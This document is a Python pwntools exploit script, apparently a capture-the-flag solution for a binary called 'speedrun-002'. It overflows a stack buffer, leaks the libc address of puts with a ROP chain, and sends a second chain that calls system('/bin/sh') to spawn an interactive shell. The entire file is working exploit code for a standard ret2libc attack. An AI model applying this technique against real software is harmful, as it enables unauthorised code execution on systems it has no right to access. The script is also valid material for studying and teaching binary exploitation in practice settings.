from pwn import *

def send_payload(p, payload):
    p.sendafter('?\n', 'Everything intelligent is so boring.')
    p.sendafter('more.\n', payload)
    p.recvuntil('Fascinating.\n')

context(arch='amd64')

p = process('./speedrun-002')
elf = ELF('./speedrun-002')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Leak puts address

target_func = 0x000000000040074c
puts_plt = elf.plt.puts
puts_got = elf.got.puts

log.info('target_func @ 0x%x' % (target_func, ))
log.info('puts.plt @ 0x%x' % (puts_plt, ))
log.info('puts.got @ 0x%x' % (puts_got, ))

padding = b'A' * 0x408

rop = ROP('./speedrun-002')
rop.call(puts_plt, [puts_got])
rop.raw(target_func)

payload = padding + rop.chain()

send_payload(p, payload)

puts_addr = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = puts_addr - libc.symbols.puts
system_addr = libc.symbols.system
bin_sh_addr = libc.search(b'/bin/sh\x00').__next__()

# Execute system('/bin/sh')

log.success('puts @ 0x%x' % (puts_addr, ))
log.info('system @ 0x%x' % (system_addr, ))
log.info('/bin/sh @ 0x%x' % (bin_sh_addr, ))

rop = ROP('./speedrun-002')
rop.call(system_addr, [bin_sh_addr])

payload = padding + rop.chain()

send_payload(p, payload)

p.interactive()
